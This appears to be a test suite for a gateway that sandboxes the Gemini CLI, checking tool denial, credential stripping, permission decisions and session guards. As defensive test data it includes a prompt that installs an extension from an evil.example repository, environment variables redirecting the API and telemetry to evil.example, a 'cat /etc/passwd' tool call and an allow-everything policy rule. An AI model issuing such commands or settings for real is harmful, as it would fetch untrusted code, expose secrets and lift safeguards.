import test from "node:test";
import assert from "node:assert/strict";
import { mkdir, mkdtemp, readFile, realpath, rm, stat, writeFile } from "node:fs/promises";
import { tmpdir } from "node:os";
import { delimiter, join } from "node:path";
import { ensureGeminiHome, geminiBuiltInTools, geminiCommand, geminiCredentialFile, geminiEnv, geminiManagedPolicy, geminiManagedSettings, geminiPoliciesDir, geminiPolicyFile, geminiSystemDefaultsFile, geminiSystemSettingsFile, hasGeminiLogin, mergeGeminiSettings } from "../providers/gemini-home.js";
import { frameGeminiPrompt, geminiLiveArgs, geminiPermission, geminiToolGuard } from "../providers/gemini-acp.js";
import { ProviderError } from "../providers/provider.js";
import { geminiSessionSettings, validateConfig } from "../config.js";
import { adapter, harness, live, turn, until, user } from "./gemini-live-harness.js";

const base = { version: 1 as const, port: 3457, stateDirectory: "/state", providers: [{ id: "gemini", label: "Gemini", type: "gemini-subscription" as const, models: { "gemini/ultra": "gemini-ultra" } }] };
const rejected = (promise: Promise<unknown>) => promise.then(() => undefined, error => error as ProviderError);
// A real PNG header, so a refusal test reaches the provider's own text-only rule rather than the protocol's image check.
const png = "data:image/png;base64," + Buffer.from([137, 80, 78, 71, 13, 10, 26, 10, 0, 0, 0, 0]).toString("base64");
const creds = (home: string, body: unknown) => writeFile(geminiCredentialFile(home), JSON.stringify(body), { mode: 0o600 });

test("gemini-subscription is a valid provider type whose home defaults inside the state directory", () => {
  const config = validateConfig(structuredClone(base), "/etc");
  assert.equal(config.providers[0]!.type, "gemini-subscription");
  assert.equal(config.providers[0]!.geminiHome, join("/state", "gemini-home"));
  const moved = validateConfig({ ...structuredClone(base), providers: [{ ...base.providers[0]!, geminiHome: "custom-home" }] }, "/etc");
  assert.equal(moved.providers[0]!.geminiHome, join("/etc", "custom-home"));
});

test("geminiHome and geminiSessions belong to Gemini providers only", () => {
  assert.throws(() => validateConfig({ ...structuredClone(base), providers: [{ ...base.providers[0]!, type: "responses-api" as never, baseUrl: "https://x.example/v1", apiKeyEnv: "K", geminiHome: "/h" }] }, "/e"), /geminiHome is only valid/);
  assert.throws(() => validateConfig({ ...structuredClone(base), providers: [{ ...base.providers[0]!, type: "responses-api" as never, baseUrl: "https://x.example/v1", apiKeyEnv: "K", geminiSessions: { max: 2 } }] }, "/e"), /geminiSessions is only valid/);
});

test("geminiSessions is validated like grokSessions: mode, bounded limits, absent means live", () => {
  const ok = validateConfig({ ...structuredClone(base), providers: [{ ...base.providers[0]!, geminiSessions: { mode: "live", max: 3, parkMinutes: 10, toolWaitMinutes: 5 } }] }, "/e");
  assert.deepEqual(ok.providers[0]!.geminiSessions, { mode: "live", max: 3, parkMinutes: 10, toolWaitMinutes: 5 });
  const tooMany = structuredClone(base); (tooMany.providers[0] as Record<string, unknown>).geminiSessions = { max: 17 };
  assert.throws(() => validateConfig(tooMany, "/e"), /geminiSessions max must be 1 through 16/);
  const parked = structuredClone(base); (parked.providers[0] as Record<string, unknown>).geminiSessions = { parkMinutes: 4 };
  assert.throws(() => validateConfig(parked, "/e"), /geminiSessions parkMinutes must be 5 through 240/);
  const waited = structuredClone(base); (waited.providers[0] as Record<string, unknown>).geminiSessions = { toolWaitMinutes: 26 };
  assert.throws(() => validateConfig(waited, "/e"), /geminiSessions toolWaitMinutes must be 1 through 25/);
  const mode = structuredClone(base); (mode.providers[0] as Record<string, unknown>).geminiSessions = { mode: "replay" };
  assert.throws(() => validateConfig(mode, "/e"), /geminiSessions mode must be oneshot or live/);
  assert.deepEqual(geminiSessionSettings({}), { mode: "live", max: 4, parkMinutes: 30, toolWaitMinutes: 25 });
});

test("the managed settings close every way the CLI has of running or reporting on its own", () => {
  const managed = geminiManagedSettings();
  const exclude = (managed.tools as { exclude: string[] }).exclude;
  // The bundled default policies allow these without a permission request, so each one must be named.
  for (const name of ["read_file", "grep_search", "glob", "list_directory", "google_web_search", "web_fetch", "codebase_investigator", "invoke_agent", "shell", "write_file"]) {
    assert.ok(exclude.includes(name), `${name} is excluded`);
  }
  assert.deepEqual(exclude, [...geminiBuiltInTools]);
  assert.deepEqual((managed.mcpServers as unknown), {}, "the CLI gets no MCP server of its own");
  const mcp = managed.mcp as Record<string, unknown>;
  // An `mcp.allowed` entry makes the CLI write an ALLOW rule for `mcp_<server>_*`, which would run the caller's tools
  // with no permission request; `serverCommand` lets the CLI spawn a server of its own. Both are simply absent.
  assert.ok(!("allowed" in mcp), "an allowed list would auto-allow the caller's tools without asking");
  assert.ok(!("serverCommand" in mcp), "the CLI may not spawn a server process");
  assert.deepEqual(mcp.excluded, [], "no server is excluded: the session's one server is named by the gateway");
  // The CLI's schema rejects a null for these, so the document must carry none anywhere: a rejected key is a setting the
  // CLI did not apply, and the managed document's whole purpose is that what it says is what the CLI runs on.
  const nulls: string[] = [];
  const walk = (value: unknown, path: string) => { for (const [key, item] of Object.entries(value as Record<string, unknown>)) {
    if (item === null) nulls.push(`${path}.${key}`); else if (item && typeof item === "object" && !Array.isArray(item)) walk(item, `${path}.${key}`); } };
  walk(managed, "settings");
  assert.deepEqual(nulls, [], "no managed key is set to null");
  assert.ok(!("target" in (managed.telemetry as Record<string, unknown>)), "the telemetry backend is not named: only real backends are valid, and telemetry is off");
  assert.equal((managed.security as { disableAlwaysAllow: boolean }).disableAlwaysAllow, true, "no always-allow option may be offered");
  assert.equal((managed.security as { auth: { selectedType: string } }).auth.selectedType, "oauth-personal", "the subscription login, never an API key");
  assert.equal((managed.telemetry as { enabled: boolean }).enabled, false);
  assert.equal((managed.privacy as { usageStatisticsEnabled: boolean }).usageStatisticsEnabled, false);
  assert.equal((managed.experimental as { worktrees: boolean }).worktrees, false, "no git probe at startup");
  assert.equal((managed.general as { sessionRetention: { enabled: boolean } }).sessionRetention.enabled, false, "the CLI keeps no old turns for its own resume");
});

test("the managed settings keep what the CLI wrote and replace what the gateway owns", () => {
  const merged = JSON.parse(mergeGeminiSettings(JSON.stringify({ selectedModel: "keep-me", mcpServers: { evil: { command: "sh" } }, telemetry: { enabled: true } }))) as Record<string, unknown>;
  assert.equal(merged.selectedModel, "keep-me", "a setting the CLI wrote itself survives");
  assert.deepEqual(merged.mcpServers, {}, "the CLI gets no MCP server of its own");
  assert.equal((merged.telemetry as { enabled: boolean }).enabled, false, "telemetry stays off");
  const broken = JSON.parse(mergeGeminiSettings("{not json")) as Record<string, unknown>;
  assert.deepEqual(broken.mcpServers, {}, "an unreadable file is rewritten from the managed document");
});

test("the private home is 0700, its managed files are 0600, and only a real credential is a sign-in", async () => {
  const root = await mkdtemp(join(tmpdir(), "gateway-test-gemini-home-"));
  try {
    const home = join(root, "home");
    await ensureGeminiHome(home, { requireLogin: false });
    assert.equal((await stat(home)).mode & 0o777, 0o700, "the home is private");
    assert.equal((await stat(join(home, ".gemini"))).mode & 0o777, 0o700, "the CLI folder is private");
    assert.equal((await stat(join(home, ".gemini/settings.json"))).mode & 0o777, 0o600, "the settings are private");
    assert.equal((await stat(geminiPoliciesDir(home))).mode & 0o777, 0o700, "the policy folder is private");
    assert.equal((await stat(geminiPolicyFile(home))).mode & 0o777, 0o600, "the policy is private");
    // The two system-scope paths name files that must not exist: their absence is what closes the machine-wide scope.
    for (const path of [geminiSystemSettingsFile(home), geminiSystemDefaultsFile(home)]) {
      assert.equal(await readFile(path, "utf8").catch(() => undefined), undefined, `${path} stays absent`);
    }
    const error = await rejected(ensureGeminiHome(home));
    assert.ok(error instanceof ProviderError && error.status === 401 && error.code === "authentication", `a sign-in failure, got ${error?.code}`);
    assert.equal(await hasGeminiLogin(home), false);
    // A file that is not a credential is not a sign-in: the CLI would otherwise be spawned and fail mid-session.
    await creds(home, {});
    assert.equal(await hasGeminiLogin(home), false, "an empty credential file proves nothing");
    assert.ok((await rejected(ensureGeminiHome(home))) instanceof ProviderError);
    await creds(home, { access_token: "a" });
    assert.equal(await hasGeminiLogin(home), false, "a credential without a refresh token is not a sign-in");
    await creds(home, { access_token: "a", refresh_token: "r" });
    await ensureGeminiHome(home);
    assert.equal(await hasGeminiLogin(home), true);
    // The settings are written once: a second pass leaves the file alone.
    const before = await readFile(join(home, ".gemini/settings.json"), "utf8");
    await ensureGeminiHome(home);
    assert.equal(await readFile(join(home, ".gemini/settings.json"), "utf8"), before);
  } finally { await rm(root, { recursive: true, force: true }); }
});

/** Reads back the `[[rule]]` blocks the gateway writes, so a test can hold them to the CLI's own schema. */
const policyRules = (text: string): Array<Record<string, unknown>> => text.split("[[rule]]").slice(1).map(block => {
  const rule: Record<string, unknown> = {};
  for (const line of block.split("\n")) {
    const match = /^([A-Za-z_]+) = (.*)$/.exec(line.trim());
    if (match) rule[match[1]] = JSON.parse(match[2].replace(/'/g, "\\u0027"));
  }
  return rule;
});

test("the policy file denies every CLI-native tool and tells only the caller's tools to ask", async () => {
  const root = await mkdtemp(join(tmpdir(), "gateway-test-gemini-policy-"));
  try {
    const home = join(root, "home");
    await ensureGeminiHome(home, { requireLogin: false });
    const text = await readFile(geminiPolicyFile(home), "utf8");
    const rules = policyRules(text);
    assert.ok(rules.length >= 3, "one rule to ask, and at least two to deny");
    for (const rule of rules) {
      const names = Array.isArray(rule.toolName) ? rule.toolName : [rule.toolName];
      assert.ok(names.every(name => typeof name === "string" && name.length > 0), `toolName is a name or a list of them: ${JSON.stringify(rule.toolName)}`);
      assert.ok(["allow", "deny", "ask_user"].includes(rule.decision as string), "decision is one the CLI accepts");
      assert.notEqual(rule.decision, "allow", "nothing is ever allowed here: the gateway's own answer is what lets a tool run");
      assert.equal(typeof rule.priority, "number", "priority is required by the CLI's schema");
      assert.ok(Number.isInteger(rule.priority) && (rule.priority as number) >= 0 && (rule.priority as number) <= 999, "priority is an integer the CLI will not reject");
    }
    const denied = new Set(rules.filter(rule => rule.decision === "deny").flatMap(rule => (Array.isArray(rule.toolName) ? rule.toolName : [rule.toolName as string])));
    for (const name of geminiBuiltInTools) assert.ok(denied.has(name) || denied.has("*"), `${name} is denied`);
    const ask = rules.filter(rule => rule.decision === "ask_user" && rule.toolName === "mcp_gateway_*");
    assert.equal(ask.length, 1, "the caller's tools, which the CLI names mcp_gateway_<tool>, are the one thing that asks");
    // Rank decides the answer: tier (user = 4) + priority/1000, and the CLI takes the highest-matching rule. The ask
    // must therefore outrank the denies, or the caller's tools would be denied before the gateway ever saw them.
    const highestDeny = Math.max(...rules.filter(rule => rule.decision === "deny").map(rule => rule.priority as number));
    assert.ok((ask[0]!.priority as number) > highestDeny, "the ask rule outranks every deny rule");
    // Idempotence: the file is only rewritten when it changed, so a session start does not churn it.
    const before = text;
    await ensureGeminiHome(home, { requireLogin: false });
    assert.equal(await readFile(geminiPolicyFile(home), "utf8"), before);
    // Something else's write is overwritten: this file is the gateway's.
    await writeFile(geminiPolicyFile(home), '[[rule]]\ntoolName = "*"\ndecision = "allow"\npriority = 999\n');
    await ensureGeminiHome(home, { requireLogin: false });
    assert.ok(!(await readFile(geminiPolicyFile(home), "utf8")).includes('\"allow\"'), "an allow rule written over the gateway's is replaced");
  } finally { await rm(root, { recursive: true, force: true }); }
});

test("the system-scope files stay absent, and one left by an earlier build is removed", async () => {
  const root = await mkdtemp(join(tmpdir(), "gateway-test-gemini-system-"));
  try {
    const home = join(root, "home");
    await ensureGeminiHome(home, { requireLogin: false });
    // An earlier build of this provider wrote its managed document at the system path; it must not survive, because the
    // CLI would then read a document the gateway no longer maintains above the one it does.
    const legacy = join(home, ".gemini", "gateway-managed-settings.json");
    await writeFile(legacy, JSON.stringify({ stale: true }));
    await ensureGeminiHome(home, { requireLogin: false });
    assert.equal(await readFile(legacy, "utf8").catch(() => undefined), undefined, "the stale system document is gone");
    assert.deepEqual(JSON.parse(await readFile(join(home, ".gemini", "settings.json"), "utf8")).stale, undefined, "and never merged into the settings the CLI reads");
  } finally { await rm(root, { recursive: true, force: true }); }
});

test("the home must be a private directory this user owns", async () => {
  const root = await mkdtemp(join(tmpdir(), "gateway-test-gemini-home-"));
  try {
    const file = join(root, "not-a-dir"); await writeFile(file, "");
    const error = await rejected(ensureGeminiHome(file));
    assert.ok(error instanceof ProviderError && error.status === 400, `a refusal, got ${error?.code}`);
  } finally { await rm(root, { recursive: true, force: true }); }
});

test("no Google, Vertex or Gemini credential reaches the CLI, and only the gateway's own switches are set", () => {
  const saved = { ...process.env };
  try {
    for (const [name, value] of Object.entries({ GOOGLE_API_KEY: "secret", GOOGLE_GENAI_USE_VERTEXAI: "true", GOOGLE_GENAI_USE_GCA: "true", GOOGLE_CLOUD_PROJECT: "secret", GOOGLE_CLOUD_ACCESS_TOKEN: "secret",
      GOOGLE_APPLICATION_CREDENTIALS: "/secret.json", GOOGLE_GEMINI_BASE_URL: "https://evil.example", VERTEX_PROJECT: "secret", GEMINI_API_KEY: "secret", GEMINI_MODEL: "someone-elses-model",
      GEMINI_CLI_AUTH_OVERRIDE: "gemini-api-key", GEMINI_CLI_USE_COMPUTE_ADC: "true", GEMINI_CLI_INTEGRATION_TEST: "true", GEMINI_FORCE_ENCRYPTED_FILE_STORAGE: "true",
      GEMINI_CLI_SYSTEM_SETTINGS_PATH: "/someone-else/settings.json", GEMINI_CLI_SYSTEM_DEFAULTS_PATH: "/someone-else/defaults.json", CLOUD_SHELL: "true", SANDBOX: "sandbox-exec", VITEST: "true", NO_BROWSER: "true", OTEL_EXPORTER_OTLP_ENDPOINT: "https://evil.example",
      CI: "true", DEBIAN_FRONTEND: "noninteractive", BROWSER: "www-browser", SSH_CONNECTION: "10.0.0.1 1 10.0.0.2 22" })) {
      process.env[name] = value;
    }
    const env = geminiEnv("/private/gemini-home");
    for (const name of ["GOOGLE_API_KEY", "GOOGLE_GENAI_USE_VERTEXAI", "GOOGLE_GENAI_USE_GCA", "GOOGLE_CLOUD_PROJECT", "GOOGLE_CLOUD_ACCESS_TOKEN", "GOOGLE_APPLICATION_CREDENTIALS", "GOOGLE_GEMINI_BASE_URL",
      "VERTEX_PROJECT", "GEMINI_API_KEY", "GEMINI_MODEL", "GEMINI_CLI_AUTH_OVERRIDE", "GEMINI_CLI_USE_COMPUTE_ADC", "GEMINI_CLI_INTEGRATION_TEST", "GEMINI_FORCE_ENCRYPTED_FILE_STORAGE", "CLOUD_SHELL",
      "SANDBOX", "VITEST", "NO_BROWSER", "OTEL_EXPORTER_OTLP_ENDPOINT", "CI", "DEBIAN_FRONTEND", "BROWSER", "SSH_CONNECTION"]) {
      assert.equal(env[name], undefined, `${name} is removed`);
    }
    assert.equal(env.GEMINI_CLI_HOME, "/private/gemini-home", "the CLI selects the gateway's home");
    assert.equal(env.GEMINI_CLI_SYSTEM_SETTINGS_PATH, geminiSystemSettingsFile("/private/gemini-home"), "nothing outside the home can outrank the managed settings");
    assert.equal(env.GEMINI_CLI_SYSTEM_DEFAULTS_PATH, geminiSystemDefaultsFile("/private/gemini-home"), "nor can the system defaults scope, which the CLI would otherwise read beside the system settings");
    assert.equal(env.GEMINI_FORCE_FILE_STORAGE, "true", "the credential stays in the home, not the macOS keychain");
    assert.equal(env.GEMINI_CLI_NO_RELAUNCH, "true", "one process, so one kill ends the CLI and anything it started");
    assert.ok(Object.keys(env).filter(name => name.startsWith("GEMINI_")).every(name => ["GEMINI_CLI_HOME", "GEMINI_CLI_SYSTEM_SETTINGS_PATH", "GEMINI_CLI_SYSTEM_DEFAULTS_PATH", "GEMINI_FORCE_FILE_STORAGE", "GEMINI_CLI_NO_RELAUNCH"].includes(name)),
      "the gateway sets nothing else in the CLI's own namespace");
  } finally { for (const name of Object.keys(process.env)) if (!(name in saved)) delete process.env[name]; Object.assign(process.env, saved); }
});

test("the CLI is found on PATH", async () => {
  const root = await mkdtemp(join(tmpdir(), "gateway-test-gemini-bin-"));
  const savedPath = process.env.PATH;
  try {
    await mkdir(join(root, "bin"));
    const path = join(root, "bin/gemini"); await writeFile(path, "#!/bin/sh\nexit 0\n", { mode: 0o700 });
    process.env.PATH = join(root, "bin") + delimiter + (savedPath ?? "");
    assert.equal(await geminiCommand(), path);
  } finally { process.env.PATH = savedPath; await rm(root, { recursive: true, force: true }); }
});

test("a stand-in opener goes first on PATH when one is given, and the browser-skipping variables stay removed", () => {
  const saved = { ...process.env };
  try {
    process.env.PATH = "/usr/bin:/bin"; process.env.CI = "true";
    const env = geminiEnv("/private/gemini-home", { shimDir: "/session/bin" });
    assert.equal(env.PATH?.split(delimiter)[0], "/session/bin");
    assert.equal(env.CI, undefined);
    assert.equal(geminiEnv("/private/gemini-home").PATH, "/usr/bin:/bin", "without a stand-in the PATH is the caller's");
  } finally { for (const name of Object.keys(process.env)) if (!(name in saved)) delete process.env[name]; Object.assign(process.env, saved); }
});

test("the managed tool list covers every built-in the bundle registers", () => {
  // From ALL_BUILTIN_TOOL_NAMES in the 0.70.0 bundle; `run_shell_command` is the real shell tool, the other names guard what the bundled policies allow.
  for (const name of ["glob", "write_todos", "write_file", "google_web_search", "web_fetch", "replace", "run_shell_command", "grep_search", "read_many_files", "read_file", "list_directory",
    "activate_skill", "ask_user", "tracker_create_task", "tracker_update_task", "tracker_get_task", "tracker_list_tasks", "tracker_add_dependency", "tracker_visualize", "get_internal_docs",
    "enter_plan_mode", "exit_plan_mode", "update_topic", "complete_task", "invoke_agent", "read_mcp_resource", "list_mcp_resources"]) {
    assert.ok((geminiBuiltInTools as readonly string[]).includes(name), `${name} is excluded and denied by name`);
  }
});

test("the session names the CLI's model and never an approval flag", () => {
  assert.deepEqual(geminiLiveArgs({ model: "gemini-3.8-flash" }), ["--acp", "-m", "gemini-3.8-flash"]);
  for (const flag of ["--yolo", "--approval-mode", "--always-approve"]) assert.ok(!geminiLiveArgs({ model: "m" }).includes(flag), flag);
});

const catalog = new Set(["lookup"]);
const permission = (toolCall: Record<string, unknown>, options: unknown[] = [{ optionId: "a", kind: "allow_once" }, { optionId: "aa", kind: "allow_always" }, { optionId: "r", kind: "reject_once" }]) =>
  geminiPermission({ toolCall, options }, catalog);

test("permissions allow_once only a gateway-server catalog tool and never choose allow_always", () => {
  const allowed = permission({ kind: "other", title: "lookup", rawInput: { tool_name: "lookup" }, _meta: { server: "gateway" } });
  assert.equal(allowed.allowed, true);
  assert.deepEqual(allowed.result, { outcome: { outcome: "selected", optionId: "a" } }, "allow_once, never the always option");
});

test("permissions read the CLI's own MCP fields and its mcp_<server>_<tool> name", () => {
  // The 0.70.0 CLI carries the real server and tool name under _meta["gemini-cli"].mcp.
  const viaMeta = permission({ kind: "other", title: "Run lookup", _meta: { "gemini-cli": { mcp: { server_name: "gateway", tool_name: "lookup" } } } });
  assert.equal(viaMeta.allowed, true, "the tool the CLI actually called is the one judged");
  const foreign = permission({ kind: "other", title: "Run lookup", _meta: { "gemini-cli": { mcp: { server_name: "somewhere_else", tool_name: "lookup" } } } });
  assert.equal(foreign.allowed, false, "the field the CLI fills wins over the title");
  // MCP tools are named mcp_<server>_<tool>, so that prefix is stripped before the catalog is consulted.
  const prefixed = permission({ kind: "other", title: "Run the search", name: "mcp_gateway_lookup" });
  assert.equal(prefixed.allowed, true, "the CLI's own spelling of a caller tool is recognised from its structured name");
});

test("permissions never allow on the display title, which is text the model shaped", () => {
  // The title is exactly the caller tool's name and nothing else in the frame names the tool: there is no identity to
  // judge, so the request is refused rather than trusted.
  const titled = permission({ kind: "other", title: "lookup" });
  assert.equal(titled.allowed, false, "a title is not an identity");
  assert.deepEqual(titled.result, { outcome: { outcome: "selected", optionId: "r" } }, "answered with reject_once");
  // Nor does the CLI's own spelling of a gateway tool authorize anything as display text.
  const shaped = permission({ kind: "other", title: "mcp_gateway_lookup", rawInput: { arguments: {} } });
  assert.equal(shaped.allowed, false, "the same words in the title are not the CLI saying which tool it called");
  // The same tool is allowed the moment a structured field names it.
  const identified = permission({ kind: "other", title: "Run lookup", rawInput: { tool_name: "lookup" } });
  assert.equal(identified.allowed, true, "structured identity, not display text, is what authorizes the run");
});

test("permissions reject a native tool, an unknown tool, another server and anything unidentifiable", () => {
  const reject = (label: string, toolCall: Record<string, unknown>) => {
    const decision = permission(toolCall);
    assert.equal(decision.allowed, false, label);
    assert.deepEqual(decision.result, { outcome: { outcome: "selected", optionId: "r" } }, label);
  };
  reject("a built-in command", { kind: "execute", title: "touch x", rawInput: { command: "touch x" } });
  reject("a tool the caller never offered", { kind: "other", title: "delete_all", rawInput: { tool_name: "delete_all" }, _meta: { server: "gateway" } });
  reject("another MCP server", { kind: "other", title: "lookup", rawInput: { tool_name: "lookup" }, _meta: { server: "somewhere_else" } });
  reject("no name at all", { kind: "other", title: "something", _meta: { server: "gateway" } });
  reject("an empty request", {});
  // With no rejection offered the request is cancelled rather than approved.
  const cancelled = geminiPermission({ toolCall: { kind: "execute", title: "touch x" }, options: [] }, catalog);
  assert.deepEqual(cancelled.result, { outcome: { outcome: "cancelled" } });
});

test("the announcement guard ends a session over a tool the caller never offered", () => {
  // A `session/update` announcement carries the call flat on the update, not nested under `toolCall`.
  assert.equal(geminiToolGuard({ sessionUpdate: "tool_call", toolCallId: "n1", title: "cat /etc/passwd", kind: "execute", status: "in_progress" }, catalog), "invalid_tool_call", "a native tool running unasked");
  assert.equal(geminiToolGuard({ sessionUpdate: "tool_call", toolCallId: "n2", title: "grep_search", status: "in_progress" }, catalog), "invalid_tool_call", "a built-in the bundled policy auto-allows");
  assert.equal(geminiToolGuard({ sessionUpdate: "tool_call", toolCallId: "n3", title: "lookup", status: "in_progress", _meta: { server: "somewhere_else" } }, catalog), "invalid_tool_call", "another server");
  assert.equal(geminiToolGuard({ sessionUpdate: "tool_call_update", toolCallId: "n4", rawInput: { tool_name: "delete_all" }, _meta: { server: "gateway" }, status: "completed" }, catalog), "invalid_tool_call", "a completed call for a tool that was never offered");
  // What must not be killed: the caller's own tool, and an announcement that names nothing (the permission layer is fail-closed).
  assert.equal(geminiToolGuard({ sessionUpdate: "tool_call", toolCallId: "u", title: "lookup", status: "pending" }, catalog), undefined);
  assert.equal(geminiToolGuard({ sessionUpdate: "tool_call_update", toolCallId: "u", status: "completed", rawInput: { tool_name: "lookup" } }, catalog), undefined);
  assert.equal(geminiToolGuard({ sessionUpdate: "tool_call_update", toolCallId: "u", status: "completed", title: "Reading the file for you" }, catalog), undefined, "a display title is not an identity");
  assert.equal(geminiToolGuard({ sessionUpdate: "tool_call", toolCallId: "u", title: "tool_not_in_catalog", status: "pending" }, catalog), undefined, "a refusal is enough while nothing has run");
});

test("the guard decides built-in or caller tool from the CLI's identity, never from its title", () => {
  const named = new Set(["grep_search", "read_file"]);
  // The CLI's own MCP fields say whose tool this is, so the caller may name one after a built-in and keep it.
  assert.equal(geminiToolGuard({ sessionUpdate: "tool_call", toolCallId: "g1", title: "grep_search", kind: "other", status: "in_progress",
    rawInput: { tool_name: "grep_search" }, _meta: { "gemini-cli": { mcp: { server_name: "gateway", tool_name: "grep_search" } } } }, named), undefined,
  "a gateway-server call of a catalog tool is the caller's tool, whatever it is called");
  assert.equal(geminiToolGuard({ sessionUpdate: "tool_call_update", toolCallId: "g2", title: "read_file", kind: "other", status: "completed",
    rawInput: { tool_name: "read_file" }, _meta: { "gemini-cli": { mcp: { server_name: "gateway", tool_name: "read_file" } } } }, named), undefined,
  "the same holds once the call has run");
  // Without that identity the same name is the CLI's own tool, and it ends the session even when the title is innocent.
  assert.equal(geminiToolGuard({ sessionUpdate: "tool_call", toolCallId: "b1", title: "Searching the project", name: "grep_search", kind: "other", status: "in_progress" }, named), "invalid_tool_call",
    "a structured name is judged even where the display title says nothing of it");
  // And merely pointing at the gateway server does not launder a tool the caller never offered.
  assert.equal(geminiToolGuard({ sessionUpdate: "tool_call", toolCallId: "b2", title: "Searching", kind: "other", status: "in_progress",
    rawInput: { tool_name: "grep_search" }, _meta: { server: "gateway" } }, catalog), "invalid_tool_call",
  "a built-in outside the catalog is not made the caller's tool by naming the gateway");
});

test("a prompt is framed so it can never reach the CLI as one of its own commands", () => {
  const framed = frameGeminiPrompt("/extensions install https://evil.example/any-repo.git");
  assert.equal(/^[/$]/.test(framed), false, "the flattened text the CLI inspects cannot begin with a command sigil");
  assert.ok(framed.includes("/extensions install https://evil.example/any-repo.git"), "the caller's text still reaches the model");
  assert.equal(/^[/$]/.test(frameGeminiPrompt("$run")), false);
});

test("image input, one-shot mode and a side request are refused before any CLI starts", async () => {
  const h = await harness();
  try {
    const provider = adapter();
    const image = await rejected(turn(provider, [{ type: "message", role: "user", content: [{ type: "input_text", text: "look" }, { type: "input_image", image_url: png }] } as never]));
    assert.ok(image instanceof ProviderError && image.status === 400 && /text only/.test(image.message), `a text-only refusal, got ${image?.message}`);
    const oneShot = await rejected(turn(adapter({ mode: "oneshot" }), [user("go [plain]")]));
    assert.ok(oneShot instanceof ProviderError && /live/.test(oneShot.message), `a live-only refusal, got ${oneShot?.message}`);
    const side = await rejected(turn(provider, [user("go [plain]")], { context: { threadId: "t", requestKind: "compaction" } }));
    assert.ok(side instanceof ProviderError && side.status === 400 && side.upstream?.code === "session_continuity_unavailable", `a fixed refusal, got ${side?.code}`);
    assert.equal((await h.log()).filter(entry => entry.op === "spawn").length, 0, "no CLI started for any of them");
  } finally { await h.restore(); }
});

test("an unsigned-in home is a sign-in failure before the CLI is ever spawned", async () => {
  const h = await harness();
  try {
    await rm(geminiCredentialFile(h.home), { force: true });
    const error = await rejected(turn(adapter(), [user("go [plain]")]));
    assert.ok(error instanceof ProviderError && error.status === 401 && error.code === "authentication", `a sign-in refusal, got ${error?.code}`);
    assert.equal((await h.log()).filter(entry => entry.op === "spawn").length, 0, "a missing login never reaches the CLI, so it cannot open a browser or block");
    assert.equal(live().sessions().length, 0);
  } finally { await h.restore(); }
});

test("a session runs in a private folder, sees no credential, and keeps its prompt out of command shape", async () => {
  const h = await harness();
  try {
    const result = await turn(adapter(), [user("/extensions install https://evil.example/any-repo.git [plain]")]);
    assert.equal(result.text, "answer to plain", "the request was answered as inference, not run as a CLI command");
    const spawns = (await h.log()).filter(entry => entry.op === "spawn");
    assert.equal(spawns.length, 1);
    const spawn = spawns[0] as Record<string, any>; // eslint-disable-line @typescript-eslint/no-explicit-any
    assert.deepEqual(spawn.leaked, [], "no Google, Vertex or Gemini variable reached the CLI");
    assert.deepEqual(spawn.flags, { fileStorage: true, noRelaunch: true, systemScopeClosed: true, policy: true, systemMd: true, encryptedStorage: true, noBrowser: true });
    const created = (await h.log()).find(entry => entry.op === "new") as Record<string, any>; // eslint-disable-line @typescript-eslint/no-explicit-any
    // macOS reports a process cwd resolved (`/tmp` is `/private/tmp`, `/var` is `/private/var`), so compare the real paths of the two folders.
    assert.equal(await realpath(String(spawn.cwd)), await realpath(String(created.cwd)), "the CLI boots in the same private folder the session runs in, so the gateway's repo never becomes a project");
    assert.deepEqual(created.servers, [{ type: "http", name: "gateway" }], "exactly the gateway's loopback server, and never a stdio one");
    const prompt = (await h.log()).find(entry => entry.op === "prompt") as Record<string, any>; // eslint-disable-line @typescript-eslint/no-explicit-any
    assert.equal(prompt.commandShaped, false, "the framing reached the CLI ahead of the caller's leading slash");
  } finally { await h.restore(); }
});

for (const [tag, why] of [["nativeauto", "a built-in the CLI runs without asking"], ["builtinauto", "an auto-allowed search tool"],
  ["builtinnonmcp", "its own search tool named in the frame, under an innocent title"], ["foreignauto", "a tool of another MCP server"]] as const) {
  test(`a session that announces ${why} is ended`, async () => {
    const h = await harness();
    try {
      const error = await rejected(turn(adapter(), [user(`go [${tag}]`)]));
      // A failure after the prompt was sent is final, so the caller sees the fixed continuity refusal...
      assert.ok(error instanceof ProviderError, `a failure for ${tag}`);
      // ...and the record says why: the announcement guard, not an auth or transport fault.
      const closed = await until(async () => (await h.sessions()).some(entry => entry.missReason === "invalid_tool_call"));
      assert.ok(closed, `${tag}: ${JSON.stringify((await h.sessions()).slice(-2))}`);
    } finally { await h.restore(); }
  });
}
